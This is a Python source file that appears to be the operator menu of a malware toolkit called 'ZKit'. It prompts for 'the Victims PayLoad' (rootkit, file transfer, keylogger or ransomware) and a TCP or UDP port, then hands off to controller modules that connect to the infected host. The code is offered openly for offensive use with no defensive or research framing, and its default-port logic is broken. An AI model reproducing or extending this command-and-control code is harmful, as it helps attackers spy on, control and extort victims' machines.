"Talks to controllers"

import os
import core.lib.controllers.rootkit_controller as r_ctrl
import core.lib.controllers.keylogger_controller as k_ctrl
import core.lib.controllers.ransomware_controller as ran_ctrl
from core.helper_core import Color, notify


class Main:
    "Talks to controllers . gets info from user and lets user have fun"

    def __init__(self):
        self.col = Color().GetColor
        self.red, self.green, self.blue, self.reset = self.col('red'), self.col(
            'green'), self.col("blue"), self.col("reset")
        if os.name == 'nt':
            from colorama import init  # pylint: disable=C0415; # noqa
            init(convert=True)

        conn, port, type_ = self.get_info()

        if self.validate((conn, port, type_)):
            if type_ == "keylogger": 
                k_ctrl.connect(conn,port)
            elif type_ in ("rootkit", "ft"):
                r_ctrl.connect(conn, port, type_)
            else :
                ran_ctrl.connect(conn,port)


    def get_info(self):
        "Gets info from user"

        print("What Is The Victims PayLoad ?\n"
              + self.red + "{1}--> Rootkit\n"
              + self.blue + "{2}--> File Transfer (ft)\n"
              + self.green + "{3}--> KeyLogger\n"
              + self.red + "{4}--> Ransomware\n"
              + self.blue + "{000}--> Back To Main Menu\n" + self.reset)

        choice = str(input("..> "))
        if choice == "000":
            return ("Error", "Error", "Error")

        if choice in ("1", "2", "3", "4"):
            print("At The Time Of Creation Of Payload . ZKit Asked About A Connection Type "
                  "What Was It ?\n"
                  + self.red + "{1}--> TCP\n"
                  + self.green + "{2}--> UDP\n" + self.reset)
            conn = str(input("..> "))
            
            notify(
                "question", "what port did you used ? left empty to use default (1534)")
            port = int(input("..> "))
            if port == "-1":
                port = 1534
                
            if choice == "1" :
                type_ = "rootkit"
            elif choice == "2":
                type_ = "ft"
            elif choice == "3":
                type_ = "keylogger"
            elif choice == "4":
                type_ = "ransomware"
            return ("TCP" if conn == "1" else "UDP", port, type_)
        notify("notify",
               "Invalid Input {" + "{}".format(choice) + "}")
        return ("Error", "Error", "Error")

    @ staticmethod
    def validate(payload_tuple: tuple) -> bool:
        "validates data from user"
        conn, port, type_ = payload_tuple
        return conn in ["TCP", "UDP"] and isinstance(port, int) and type_ in ["ft", "rootkit", "keylogger", "ransomware"]
